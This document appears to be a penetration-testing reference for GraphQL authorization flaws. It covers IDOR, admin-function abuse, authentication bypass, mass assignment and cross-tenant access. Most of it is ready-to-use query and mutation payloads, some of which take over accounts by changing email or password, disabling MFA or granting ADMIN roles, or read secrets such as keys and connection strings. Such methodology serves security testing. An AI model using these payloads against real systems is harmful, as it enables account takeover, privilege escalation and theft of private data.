# Authorization Testing Reference

## Core Principle

GraphQL has NO built-in authorization. Every resolver is custom code.
This means access control bugs are extremely common — developers must
manually check permissions for every single field and argument.

---

## 1. IDOR (Insecure Direct Object Reference)

### Pattern Recognition

Look in schema for any query/mutation that accepts an ID argument:

```graphql
user(id: ID!)
order(orderId: Int!)
invoice(uuid: String!)
message(threadId: ID!)
document(fileId: String!)
address(addressId: Int!)
paymentMethod(id: ID!)
```

### Basic IDOR Test

```graphql
# Step 1: Query your own object (note your ID)
query {
  user(id: "YOUR_USER_ID") {
    id
    email
    phone
    address
    paymentMethods { last4 cardType }
  }
}

# Step 2: Query another user's ID
query {
  user(id: "VICTIM_USER_ID") {
    id
    email
    phone
    address
    paymentMethods { last4 cardType }
  }
}
```

### ID Enumeration Strategy

```graphql
# Sequential integer IDs
query { user(id: 1) { id email role } }
query { user(id: 2) { id email role } }

# Use alias to enumerate multiple IDs in one request
query {
  u1: user(id: 1) { id email role }
  u2: user(id: 2) { id email role }
  u3: user(id: 3) { id email role }
  u4: user(id: 4) { id email role }
  u5: user(id: 5) { id email role }
}

# UUID: use known UUIDs from your account + try variations
# Look for UUIDs in other API responses, URLs, emails
```

### Mutation IDOR (Write Operations — Critical)

```graphql
# Update another user's data
mutation {
  updateProfile(
    userId: "VICTIM_ID"
    email: "attacker@evil.com"
    phone: "+1234567890"
  ) {
    success
    user { id email }
  }
}

# Delete another user's resource
mutation {
  deleteDocument(documentId: "VICTIM_DOC_ID") {
    success
  }
}

# Access another user's private order
mutation {
  cancelOrder(orderId: "VICTIM_ORDER_ID") {
    success
    refundAmount
  }
}
```

### Object Traversal / Chaining (Advanced IDOR)

Navigate through object relationships to reach data you shouldn't access:

```graphql
# Your order → but order contains another user's payment info
query {
  order(id: "YOUR_ORDER_ID") {
    id
    user {           # ← this might return FULL user object
      id
      email
      allOrders {   # ← cross-user data via relationship traversal
        id
        items { price }
        paymentMethod { cardNumber }
      }
    }
  }
}

# Product reviews → author → author's private data
query {
  product(id: 1) {
    reviews {
      author {
        id
        email        # ← should this be accessible via product → review → author?
        phone
        orders { total }
      }
    }
  }
}
```

---

## 2. Broken Function-Level Authorization

### Admin Mutations via Low-Privilege Account

```graphql
# Try admin mutations directly — they may not check caller's role
mutation {
  deleteUser(userId: "TARGET_ID") {
    success
  }
}

mutation {
  updateUserRole(userId: "YOUR_ID", role: "ADMIN") {
    success
    user { id role }
  }
}

mutation {
  createAdminUser(
    email: "newadmin@attacker.com"
    password: "P@ssw0rd123"
    role: "ADMIN"
  ) {
    user { id email role }
    token
  }
}

mutation {
  impersonateUser(userId: "ADMIN_USER_ID") {
    token
    user { id email role }
  }
}
```

### Hidden Admin Queries (from introspection)

If introspection reveals admin-sounding queries, test them directly:

```graphql
query {
  adminGetAllUsers {
    id email role isAdmin
    paymentMethods { full cardNumber }
  }
}

query {
  systemConfig {
    dbConnectionString
    secretKey
    smtpPassword
    apiKeys { name value }
  }
}

query {
  auditLogs(userId: "1") {
    action timestamp ipAddress
  }
}
```

---

## 3. Authentication Bypass via Mutations

### Missing Auth on Sensitive Mutations

```graphql
# Try without any Authorization header
mutation {
  changePassword(
    userId: "TARGET_ID"
    newPassword: "hacked123"
  ) {
    success
  }
}

mutation {
  changeEmail(
    userId: "TARGET_ID"
    newEmail: "attacker@evil.com"
  ) {
    success
    verificationSent
  }
}

mutation {
  disableMFA(userId: "TARGET_ID") {
    success
  }
}
```

### JWT / Token Manipulation

```graphql
# After getting your JWT, decode it (jwt.io)
# Change role/isAdmin claim, re-sign with weak key or none

# Test: does the server verify the signature?
mutation {
  me {
    id
    role
    isAdmin
  }
}
# → If returns admin=true after token manipulation → critical auth bypass
```

### Nested Object Auth Bypass

Sometimes the top-level query is protected but nested fields are not:

```graphql
# Direct query (protected):
query {
  users { id email }  # → 403
}

# Via nested relationship (may not be protected):
query {
  me {
    organization {
      allMembers {    # ← no auth check on nested resolver?
        id email role passwordHash
      }
    }
  }
}
```

---

## 4. Mass Assignment / Over-Posting

GraphQL mutations accept input objects. Test if you can set fields you shouldn't:

```graphql
# Attempt to set privileged fields during registration/update
mutation {
  createAccount(input: {
    email: "attacker@test.com"
    password: "password123"
    role: "ADMIN"          # ← should not be settable
    isVerified: true       # ← skip email verification
    isPremium: true        # ← skip payment
    credits: 999999        # ← set credits
    organizationId: "1"    # ← join arbitrary org
  }) {
    user { id role isPremium }
    token
  }
}

# Update — can you include unexpected fields?
mutation {
  updateProfile(input: {
    name: "Attacker"
    isAdmin: true          # ← hidden field mass assignment
    emailVerified: true
    subscriptionTier: "enterprise"
  }) {
    user { id name isAdmin subscriptionTier }
  }
}
```

---

## 5. Cross-Tenant / Multi-Tenant Isolation Bypass

High-value on SaaS platforms:

```graphql
# Your organization context
query {
  organizationData(orgId: "YOUR_ORG_ID") {
    users invoices apiKeys
  }
}

# Another organization — does it return data?
query {
  organizationData(orgId: "OTHER_ORG_ID") {
    users invoices apiKeys
  }
}

# Via mutation
mutation {
  createInvite(
    organizationId: "TARGET_ORG_ID"
    email: "attacker@evil.com"
    role: "ADMIN"
  ) {
    success inviteLink
  }
}
```

---

## 6. Deprecated Fields — Often Less Tested

```graphql
# Request deprecated fields — they may have weaker auth
query {
  user(id: "VICTIM") {
    email
    # Try including deprecated fields:
    legacyPassword    # ← deprecated but still works?
    oldToken
    securityAnswer
    internalNotes
  }
}
```

---

## 7. Testing Checklist

```
For every query with ID argument:
[ ] Tested with own ID → baseline
[ ] Tested with other user's ID → IDOR check
[ ] Tested unauthenticated → missing auth check
[ ] Tested across organizations → tenant isolation

For every mutation:
[ ] Tested with victim's object IDs → mutation IDOR
[ ] Tested without Authorization header → missing auth
[ ] Tested with low-privilege token → function-level auth
[ ] Tested mass assignment fields → over-posting

For schema-level:
[ ] Admin mutations directly called → function-level bypass
[ ] Nested object relationships explored → traversal IDOR
[ ] Deprecated fields requested → legacy auth bypass
```
